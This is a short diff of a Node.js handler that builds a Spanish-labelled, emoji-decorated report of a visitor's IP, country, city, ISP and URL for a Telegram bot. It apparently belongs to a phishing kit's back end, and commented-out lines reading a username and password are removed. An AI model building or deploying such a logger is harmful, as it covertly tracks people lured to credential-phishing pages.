@@ -5,10 +5,15 @@ const bot = new TelegramBot(process.env.telegram_bot_id, { polling: false });
 
 const sender = async (req, res) => {
   let msg
-  //const uId = req.body.username
-  //const pwd = req.body.password
-  if(req.query.msg) {
-  msg = req.query.msg
+ 
+  if(req.query.ip) {
+  msg = `■■■■■🌐🌟👤■■■■■
+🌐 IP: ${req.query.ip}
+🗺 País: ${req.query.country_name}
+🌃 Ciudad: ${req.query.city}
+🔌Int. Comp: ${req.query.org}
+🔗URL : ${req.query.at}
+■■■■■■■■■■■■■■■`
   } else {
     return
   }
